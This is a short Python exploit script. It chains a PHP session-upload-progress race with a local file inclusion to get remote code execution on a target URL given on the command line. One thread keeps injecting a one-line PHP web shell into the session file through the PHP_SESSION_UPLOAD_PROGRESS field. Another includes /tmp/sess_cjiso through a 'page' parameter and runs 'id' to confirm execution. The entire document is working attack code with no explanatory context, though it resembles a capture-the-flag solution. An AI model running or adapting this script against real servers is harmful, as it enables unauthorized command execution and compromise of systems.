import threading
import requests
import sys

target = sys.argv[1]


def post(target, s):
    while 1:
        r = s.post(
            target,
            data={"PHP_SESSION_UPLOAD_PROGRESS": "<?=`$_GET[0]`?>"},
            files={"a": ("b.txt", "c")},
            cookies={"PHPSESSID": "cjiso"},
        )


def lfi(target, s):
    while 1:
        r = s.get(f"{target}/?page=/tmp/sess_cjiso&0=echo+rce;id")
        if "rce" in r.text:
            print("* rce succeed")
            print(r.text.split("|")[-2][20:-1])
            sys.exit(0)


with requests.session() as sess:
    print("* start post upload progress")
    t = threading.Thread(
        target=post,
        args=(
            target,
            sess,
        ),
    )
    t.daemon = True
    t.start()
    print("* start lfi")
    lfi(target, sess)
